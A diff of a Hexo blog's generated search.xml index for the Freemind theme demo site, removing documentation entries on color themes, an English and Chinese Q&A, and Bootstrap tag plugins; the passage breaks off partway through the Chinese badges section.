@@ -1,226 +1,511 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search> 
-  
-    
-    <entry>
-      <title>Color Themes</title>
-      <link href="/hexo-theme-freemind-blog/2016/01/30/color-themes/"/>
-      <url>/hexo-theme-freemind-blog/2016/01/30/color-themes/</url>
-      <content type="html"><![CDATA[<p>Freemind contains luxuriant color themes for your choice. To use one of them, simply modify the <code>theme</code> and <code>inverse</code> settings from your theme <code>_config.yml</code> file <em>e.g.</em></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">theme: bootstrap</div><div class="line">inverse: true</div></pre></td></tr></table></figure><p>, where <code>theme</code> here indicates which theme you are going to use, and <code>inverse</code> here says you want inverse color scheme on some important components such as navigation bar and header title.</p><p>User contributions are welcome! If you want to contribute a color theme, you can <a href="https://github.com/wzpan/hexo-theme-freemind-blog/tree/dev" target="_blank" rel="external">fork the dev branch</a> . Write a new theme in LESS and send me a pull request.</p><a id="more"></a><h2 id="bootstrap"><a href="#bootstrap" class="headerlink" title="bootstrap"></a>bootstrap</h2><h3 id="default"><a href="#default" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/bootstrap.png" alt="bootstrap"></p><h3 id="inverse"><a href="#inverse" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/bootstrap-inverse.png" alt="bootstrap-inverse"></p><h2 id="cerulean"><a href="#cerulean" class="headerlink" title="cerulean"></a>cerulean</h2><h3 id="default-1"><a href="#default-1" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/cerulean.png" alt="cerulean"></p><h3 id="inverse-1"><a href="#inverse-1" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/cerulean-inverse.png" alt="cerulean-inverse"></p><h2 id="cosmo"><a href="#cosmo" class="headerlink" title="cosmo"></a>cosmo</h2><h3 id="default-2"><a href="#default-2" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/cosmo.png" alt="cosmo"></p><h3 id="inverse-2"><a href="#inverse-2" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/cosmo-inverse.png" alt="cosmo-inverse"></p><h2 id="cyborg"><a href="#cyborg" class="headerlink" title="cyborg"></a>cyborg</h2><h3 id="default-3"><a href="#default-3" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/cyborg.png" alt="cyborg"></p><h3 id="inverse-3"><a href="#inverse-3" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/cyborg-inverse.png" alt="cyborg-inverse"></p><h2 id="darkly"><a href="#darkly" class="headerlink" title="darkly"></a>darkly</h2><h3 id="default-4"><a href="#default-4" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/darkly.png" alt="darkly"></p><h3 id="inverse-4"><a href="#inverse-4" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/darkly-inverse.png" alt="darkly-inverse"></p><h2 id="flatly"><a href="#flatly" class="headerlink" title="flatly"></a>flatly</h2><h3 id="default-5"><a href="#default-5" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/flatly.png" alt="flatly"></p><h3 id="inverse-5"><a href="#inverse-5" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/flatly-inverse.png" alt="flatly"></p><h2 id="journal"><a href="#journal" class="headerlink" title="journal"></a>journal</h2><h3 id="default-6"><a href="#default-6" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/journal.png" alt="journal"></p><h3 id="inverse-6"><a href="#inverse-6" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/journal-inverse.png" alt="journal-inverse"></p><h2 id="lumen"><a href="#lumen" class="headerlink" title="lumen"></a>lumen</h2><h3 id="default-7"><a href="#default-7" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/lumen.png" alt="lumen"></p><h3 id="inverse-7"><a href="#inverse-7" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/lumen-inverse.png" alt="lumen-inverse"></p><h2 id="paper"><a href="#paper" class="headerlink" title="paper"></a>paper</h2><h3 id="default-8"><a href="#default-8" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/paper.png" alt="paper"></p><h3 id="inverse-8"><a href="#inverse-8" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/paper-inverse.png" alt="paper-inverse"></p><h2 id="readable"><a href="#readable" class="headerlink" title="readable"></a>readable</h2><h3 id="default-9"><a href="#default-9" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/readable.png" alt="readable"></p><h3 id="inverse-9"><a href="#inverse-9" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/readable-inverse.png" alt="readable-inverse"></p><h2 id="sandstone"><a href="#sandstone" class="headerlink" title="sandstone"></a>sandstone</h2><h3 id="default-10"><a href="#default-10" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/sandstone.png" alt="sandstone"></p><h3 id="inverse-10"><a href="#inverse-10" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/sandstone-inverse.png" alt="sandstone-inverse"></p><h2 id="simplex"><a href="#simplex" class="headerlink" title="simplex"></a>simplex</h2><h3 id="default-11"><a href="#default-11" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/simplex.png" alt="simplex"></p><h3 id="inverse-11"><a href="#inverse-11" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/simplex-inverse.png" alt="simplex-inverse"></p><h2 id="slate"><a href="#slate" class="headerlink" title="slate"></a>slate</h2><h3 id="default-12"><a href="#default-12" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/slate.png" alt="slate"></p><h3 id="inverse-12"><a href="#inverse-12" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/slate-inverse.png" alt="slate-inverse"></p><h2 id="spacelab"><a href="#spacelab" class="headerlink" title="spacelab"></a>spacelab</h2><h3 id="default-13"><a href="#default-13" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/spacelab.png" alt="spacelab"></p><h3 id="inverse-13"><a href="#inverse-13" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/spacelab-inverse.png" alt="spacelab-inverse"></p><h2 id="superhero"><a href="#superhero" class="headerlink" title="superhero"></a>superhero</h2><h3 id="default-14"><a href="#default-14" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/superhero.png" alt="superhero"></p><h3 id="inverse-14"><a href="#inverse-14" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/superhero-inverse.png" alt="superhero-inverse"></p><h2 id="united"><a href="#united" class="headerlink" title="united"></a>united</h2><h3 id="default-15"><a href="#default-15" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/united.png" alt="united"></p><h3 id="inverse-15"><a href="#inverse-15" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/united-inverse.png" alt="united-inverse"></p><h2 id="yeti"><a href="#yeti" class="headerlink" title="yeti"></a>yeti</h2><h3 id="default-16"><a href="#default-16" class="headerlink" title="default"></a>default</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/yeti.png" alt="yeti"></p><h3 id="inverse-16"><a href="#inverse-16" class="headerlink" title="inverse"></a>inverse</h3><p><img src="/hexo-theme-freemind-blog/images/color-themes/yeti-inverse.png" alt="yeti-inverse"></p>]]></content>
-      
-      <categories>
-          
-          <category> Docs </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> themes </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Questions and Answers</title>
-      <link href="/hexo-theme-freemind-blog/2014/03/16/qna/"/>
-      <url>/hexo-theme-freemind-blog/2014/03/16/qna/</url>
-      <content type="html"><![CDATA[<span class="label label-danger">Q</span> What does <code>Freemind</code> stands for?<br><br><span class="label label-success">A</span> <code>Freemind</code> is named after <a href="http://freemind.pluskid.org/" target="_blank" rel="external">Pluskid’s blog</a>. This theme is greatly inspired by his blog layouts and stylesheets.<br><br><span class="label label-danger">Q</span> There’re already so many themes for Hexo. Why create this one?<br><br><span class="label label-success">A</span> In fact I created this theme before I turned to use Hexo. I switched to Hexo about half an year ago, including my theme, since I have already got used to it and don’t wanna change it for now.<br><br><a id="more"></a><p><span class="label label-danger">Q</span> Why use raw CSS stylesheets instead of more fashionable stylus?</p><p><span class="label label-success">A</span> Yes, stylus is cool. But I don’t want to wrote my stylesheets again in stylus. So let’s just keep them.</p><p><span class="label label-danger">Q</span> I love your theme. How to contribute?</p><p><span class="label label-success">A</span> Great that you love it. To devote your contribution, you can:</p><ul><li>Star its <a href="https://github.com/wzpan/hexo-theme-freemind" target="_blank" rel="external">Github project</a>;</li><li>Fork this project, make your change, and then send me your pull request;</li><li>Since it is public under MIT license, you can make your own theme based on mine. But it will be nicer if you claimed that your work is based on mine in your theme project page.</li></ul><p><span class="label label-danger">Q</span> <a href="http://hahack.com" target="_blank" rel="external">Your blog</a> looks a little different to this theme. Why such difference?</p><p><span class="label label-success">A</span> Yes. I modified the theme a little bit as I open sourced this theme. I actually did some simplification <em>e.g.</em> I removed the whole <a href="http://hahack.com/wiki" target="_blank" rel="external">Wiki</a> page because I don’t think that everybody need this.</p><p><span class="label label-danger">Q</span> How to generate ToC(Table of Contents) in a certain page?</p><p><span class="label label-success">A</span> Add <code>toc: true</code> in the <a href="https://github.com/wzpan/hexo-theme-freemind#front-matter" target="_blank" rel="external">front-matter</a>.</p><p><span class="label label-danger">Q</span> Where can I find your markdown source files of these docs?</p><p><span class="label label-success">A</span> From the <a href="https://github.com/wzpan/hexo-theme-freemind-blog" target="_blank" rel="external">source repo</a> of this site.</p>]]></content>
-      
-      <categories>
-          
-          <category> Docs </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Q&amp;A </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Questions and Answers（中文）</title>
-      <link href="/hexo-theme-freemind-blog/2014/03/16/qna-cn/"/>
-      <url>/hexo-theme-freemind-blog/2014/03/16/qna-cn/</url>
-      <content type="html"><![CDATA[<span class="label label-danger">Q</span> <code>Freemind</code> 这名字有何含义？<br><br><span class="label label-success">A</span> <code>Freemind</code> 命名出自 <a href="http://freemind.pluskid.org/" target="_blank" rel="external">Pluskid</a> 的博客。这个主题很大程度借鉴了他的博客的布局和样式。<br><br><span class="label label-danger">Q</span> 现在都有这么多 Hexo 的主题了，为啥又要写一个？<br><br><span class="label label-success">A</span> 实际上我这个主题在我使用 Hexo 前已经创建了。我在半年前将博客迁移到 Hexo ，因为我已经习惯了原来的主题，所以顺便把主题也移植了过来。<br><br><a id="more"></a><p><span class="label label-danger">Q</span> 为啥还用 CSS 写样式，而不用更高端大气的 stylus ？</p><p><span class="label label-success">A</span> 嗯，stylus 的确很酷。不过我不想再把以前的样式重写成 stylus 了。所以暂时先保留原来的 CSS。</p><p><span class="label label-danger">Q</span> 你的博客不错用，如何贡献？</p><p><span class="label label-success">A</span> 有人喜欢我的东西我就很高兴咯。如果想做出贡献，你可以：</p><ul><li>为本主题的 <a href="https://github.com/wzpan/hexo-theme-freemind" target="_blank" rel="external">Github 项目</a> 加颗星；</li><li>Fork 这个项目，尽情DIY，然后给我发 pull request;</li><li>这个项目遵循 MIT 开源协议，你可以在本主题基础上创建你的主题。不过如果你能在你的主题页面中声明主题基于 Freemind 就再好不过了。</li></ul><p><span class="label label-danger">Q</span> <a href="http://hahack.com" target="_blank" rel="external">你自己的博客</a> 看起来跟这个主题有点不一样呀，为什么？</p><p><span class="label label-success">A</span> 是的。我在开源这个主题前做了些简化。不是所有人都需要我的博客里的一些特性，比如 <a href="http://hahack.com/wiki" target="_blank" rel="external">Wiki</a> 页面。</p><p><span class="label label-danger">Q</span> 如何指定某些页面生成 ToC(Table of Contents) ？</p><p><span class="label label-success">A</span> 在<a href="https://github.com/wzpan/hexo-theme-freemind#front-matter" target="_blank" rel="external">文章头部</a>添加 <code>toc: true</code> 。</p><p><span class="label label-danger">Q</span> 从哪里可以找到你的这几篇文档的 Markdown 源码？</p><p><span class="label label-success">A</span> 在本站点的 <a href="https://github.com/wzpan/hexo-theme-freemind-blog" target="_blank" rel="external">源码仓库</a> 。</p>]]></content>
-      
-      <categories>
-          
-          <category> Docs </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Q&amp;A </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Tag Plugins</title>
-      <link href="/hexo-theme-freemind-blog/2014/03/16/tag-plugins/"/>
-      <url>/hexo-theme-freemind-blog/2014/03/16/tag-plugins/</url>
-      <content type="html"><![CDATA[<p>The freemind theme offers several new tag plugins, so as to fully take advantages of Bootstrap.</p><p>To use these tag plugins, you need to install <a href="https://github.com/wzpan/hexo-tag-bootstrap" target="_blank" rel="external">hexo-tag-bootstrap</a> first. In your blog root folder, execute the following command:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-tag-bootstrap --save</div></pre></td></tr></table></figure><p>Then you can use these tag plugins in your blog, as easily as you normally do using hexo tag plugins. </p><a id="more"></a><h2 id="Text-Color"><a href="#Text-Color" class="headerlink" title="Text Color"></a>Text Color</h2><p>Convey meaning through color with a handful of emphasis utility classes. These may also be applied to links and will darken on hover just like our default link styles.</p><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% textcolor [style] %&#125;</div><div class="line">  text string</div><div class="line">&#123;% endtextcolor %&#125;</div></pre></td></tr></table></figure><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&#123;% textcolor muted %&#125;</div><div class="line">Fusce dapibus, tellus ac cursus commodo, tortor mauris nibh.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor primary %&#125;</div><div class="line">Nullam id dolor id nibh ultricies vehicula ut id elit.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor success %&#125;</div><div class="line">Duis mollis, est non commodo luctus, nisi erat porttitor ligula.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor info %&#125;</div><div class="line">Maecenas sed diam eget risus varius blandit sit amet non magna.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor warning %&#125;</div><div class="line">Etiam porta sem malesuada magna mollis euismod.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor danger %&#125;</div><div class="line">Donec ullamcorper nulla non metus auctor fringilla.</div><div class="line">&#123;% endtextcolor %&#125;</div></pre></td></tr></table></figure><h3 id="Results"><a href="#Results" class="headerlink" title="Results"></a>Results</h3><p class="text-muted">Fusce dapibus, tellus ac cursus commodo, tortor mauris nibh.</p><p class="text-primary">Nullam id dolor id nibh ultricies vehicula ut id elit.</p><p class="text-success">Duis mollis, est non commodo luctus, nisi erat porttitor ligula.</p><p class="text-info">Maecenas sed diam eget risus varius blandit sit amet non magna.</p><p class="text-warning">Etiam porta sem malesuada magna mollis euismod.</p><p class="text-danger">Donec ullamcorper nulla non metus auctor fringilla.</p><h2 id="Buttons"><a href="#Buttons" class="headerlink" title="Buttons"></a>Buttons</h2><p>Inserts a button with target links, text and specified color.</p><h3 id="Syntax-1"><a href="#Syntax-1" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% btn url text [style] %&#125;</div></pre></td></tr></table></figure><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;% btn http://hahack.com hahack %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack primary %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack success %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack warning %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack danger %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack info %&#125;</div></pre></td></tr></table></figure><h3 id="Results-1"><a href="#Results-1" class="headerlink" title="Results"></a>Results</h3><a class="btn btn-default" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-primary" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-success" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-warning" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-danger" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-info" href="http://hahack.com" target="_blank" rel="external">hahack</a><h2 id="Labels"><a href="#Labels" class="headerlink" title="Labels"></a>Labels</h2><p>Inserts a label with text and specified color.</p><h3 id="Syntax-2"><a href="#Syntax-2" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% label text [style] %&#125;</div></pre></td></tr></table></figure><h3 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;% label default %&#125;</div><div class="line"></div><div class="line">&#123;% label warinng warning %&#125;</div><div class="line"></div><div class="line">&#123;% label success success %&#125;</div><div class="line"></div><div class="line">&#123;% label danger danger %&#125;</div><div class="line"></div><div class="line">&#123;% label primary primary %&#125;</div><div class="line"></div><div class="line">&#123;% label info info %&#125;</div></pre></td></tr></table></figure><h3 id="Results-2"><a href="#Results-2" class="headerlink" title="Results"></a>Results</h3><span class="label label-default">default</span><span class="label label-warning">warinng</span><span class="label label-success">success</span><span class="label label-danger">danger</span><span class="label label-primary">primary</span><span class="label label-info">info</span><h2 id="Badges"><a href="#Badges" class="headerlink" title="Badges"></a>Badges</h2><p>Inserts a badge with text.</p><h3 id="Syntax-3"><a href="#Syntax-3" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% badge text %&#125;</div></pre></td></tr></table></figure><h3 id="Examples-3"><a href="#Examples-3" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% badge 42 %&#125;</div></pre></td></tr></table></figure><h3 id="Results-3"><a href="#Results-3" class="headerlink" title="Results"></a>Results</h3><span class="badge">42</span><h2 id="Alerts"><a href="#Alerts" class="headerlink" title="Alerts"></a>Alerts</h2><p>Inserts alert messages with text and specified color.</p><h3 id="Syntax-4"><a href="#Syntax-4" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% alert [style] %&#125;</div><div class="line">   Alert string</div><div class="line">&#123;% endalert %&#125;</div></pre></td></tr></table></figure><h3 id="Examples-4"><a href="#Examples-4" class="headerlink" title="Examples"></a>Examples</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&#123;% alert warning %&#125;</div><div class="line">Best check yo self, you&apos;re not looking too good.</div><div class="line">&#123;% endalert %&#125;</div><div class="line"></div><div class="line">&#123;% alert danger %&#125;</div><div class="line">Change a few things up and try submitting again.</div><div class="line">&#123;% endalert %&#125;</div><div class="line"></div><div class="line">&#123;% alert success %&#125;</div><div class="line">You successfully read this important alert message.</div><div class="line">&#123;% endalert %&#125;</div><div class="line"></div><div class="line">&#123;% alert info %&#125;</div><div class="line">This alert needs your attention, but it&apos;s not super important.</div><div class="line">&#123;% endalert %&#125;</div></pre></td></tr></table></figure><h3 id="Results-4"><a href="#Results-4" class="headerlink" title="Results"></a>Results</h3><div class="alert alert-warning"><i class="fa fa-bell"></i>  Best check yo self, you're not looking too good.</div><div class="alert alert-danger"><i class="fa fa-bug"></i>  Change a few things up and try submitting again.</div><div class="alert alert-success"><i class="fa fa-lightbulb-o"></i>  You successfully read this important alert message.</div><div class="alert alert-info"><i class="fa fa-info"></i>  This alert needs your attention, but it's not super important.</div>]]></content>
-      
-      <categories>
-          
-          <category> Docs </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> plugins </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    <entry>
-      <title>Tag Plugins（中文）</title>
-      <link href="/hexo-theme-freemind-blog/2014/03/16/tag-plugins-cn/"/>
-      <url>/hexo-theme-freemind-blog/2014/03/16/tag-plugins-cn/</url>
-      <content type="html"><![CDATA[<p>Freemind 主题提供了丰富的 tag plugins，以充分利用 Bootstrap 的威力。</p><p>在使用这些 tag plugins 之前，你需要先安装 <a href="https://github.com/wzpan/hexo-tag-bootstrap" target="_blank" rel="external">hexo-tag-bootstrap</a> 。在你的 Hexo 博客目录，执行下列命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm install hexo-tag-bootstrap --save</div></pre></td></tr></table></figure><p>然后就可以像使用其他 hexo tag plugins 一样使用这些 Bootstrap tag plugins 了。</p><a id="more"></a><h2 id="文本颜色"><a href="#文本颜色" class="headerlink" title="文本颜色"></a>文本颜色</h2><p>插入一段文本，并用特殊的颜色高亮它。</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;% textcolor [style] %&#125;</div><div class="line">  text string</div><div class="line">&#123;% endtextcolor %&#125;</div></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">&#123;% textcolor muted %&#125;</div><div class="line">Fusce dapibus, tellus ac cursus commodo, tortor mauris nibh.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor primary %&#125;</div><div class="line">Nullam id dolor id nibh ultricies vehicula ut id elit.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor success %&#125;</div><div class="line">Duis mollis, est non commodo luctus, nisi erat porttitor ligula.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor info %&#125;</div><div class="line">Maecenas sed diam eget risus varius blandit sit amet non magna.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor warning %&#125;</div><div class="line">Etiam porta sem malesuada magna mollis euismod.</div><div class="line">&#123;% endtextcolor %&#125;</div><div class="line"></div><div class="line">&#123;% textcolor danger %&#125;</div><div class="line">Donec ullamcorper nulla non metus auctor fringilla.</div><div class="line">&#123;% endtextcolor %&#125;</div></pre></td></tr></table></figure><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p class="text-muted">Fusce dapibus, tellus ac cursus commodo, tortor mauris nibh.</p><p class="text-primary">Nullam id dolor id nibh ultricies vehicula ut id elit.</p><p class="text-success">Duis mollis, est non commodo luctus, nisi erat porttitor ligula.</p><p class="text-info">Maecenas sed diam eget risus varius blandit sit amet non magna.</p><p class="text-warning">Etiam porta sem malesuada magna mollis euismod.</p><p class="text-danger">Donec ullamcorper nulla non metus auctor fringilla.</p><h2 id="按钮（Buttons）"><a href="#按钮（Buttons）" class="headerlink" title="按钮（Buttons）"></a>按钮（Buttons）</h2><p>插入一个按钮，按钮可以带有链接、文本，并可以指定样式。</p><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% btn url text [style] %&#125;</div></pre></td></tr></table></figure><h3 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;% btn http://hahack.com hahack %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack primary %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack success %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack warning %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack danger %&#125;</div><div class="line"></div><div class="line">&#123;% btn http://hahack.com hahack info %&#125;</div></pre></td></tr></table></figure><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><a class="btn btn-default" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-primary" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-success" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-warning" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-danger" href="http://hahack.com" target="_blank" rel="external">hahack</a><a class="btn btn-info" href="http://hahack.com" target="_blank" rel="external">hahack</a><h2 id="标签（Labels）"><a href="#标签（Labels）" class="headerlink" title="标签（Labels）"></a>标签（Labels）</h2><p>插入一个标签，并为其指定文本和样式。</p><h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&#123;% label text [style] %&#125;</div></pre></td></tr></table></figure><h3 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&#123;% label default %&#125;</div><div class="line"></div><div class="line">&#123;% label warinng warning %&#125;</div><div class="line"></div><div class="line">&#123;% label success success %&#125;</div><div class="line"></div><div class="line">&#123;% label danger danger %&#125;</div><div class="line"></div><div class="line">&#123;% label primary primary %&#125;</div><div class="line"></div><div class="line">&#123;% label info info %&#125;</div></pre></td></tr></table></figure><h3 id="结果-2"><a href="#结果-2" class="headerlink" title="结果"></a>结果</h3><span class="label label-default">default</span><span class="label label-warning">warinng</span><span class="label label-success">success</span><span class="label label-danger">danger</span><span class="label label-primary">primary</span><span class="label label-info">info</span><h2 id="徽章（Badges）"><a href="#徽章（Badges）" class="headerlink" title="徽章（Badges）"></a>徽章（Badges）</h2><p>插入一个徽章，并为其指定文本。</p><h3 